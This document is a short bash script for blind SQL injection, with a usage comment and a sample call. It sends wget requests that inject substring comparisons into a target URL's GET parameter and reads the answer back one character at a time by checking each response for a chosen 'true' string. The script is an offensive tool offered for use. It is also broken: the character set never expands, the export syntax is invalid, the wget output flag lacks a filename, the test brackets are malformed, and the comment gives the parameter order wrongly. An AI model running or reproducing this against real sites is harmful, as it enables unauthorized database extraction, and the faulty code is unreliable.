#! /bin/bash

charset='echo {0..9} {A..z} \. \: \, \; \- \_ \@'

export URL=$1 
export truestring=$2
export maxlength = $3
export query = $4
export getREQ = $5

export result=""

echo "extracting the result for $query..."

for ((j=1;j<$maxlength;j+=1))
do 
   export nthchar = $j
   
   for i in $charset
   do 
      wget "$URL?$getREQ and substring (($query),$nthchar,1)='$i" -q -O | grep "$truestring" &> /dev/null
      if ["$?" == "0"]
      then 
         echo Character number $nthchar found: $i
         export result += $i
         break
      fi
   done
done

echo Result: $result  

# this bash code takes in 5 parameters in order of, 
# target URL, length of string to be enumerated, SQL query name to be enumerated from and lastly get Request targeted.
# sample input : *BLINDSQLi.sh "www.example.com" "Something Found!" 20 "Select user()" "id=1'"*
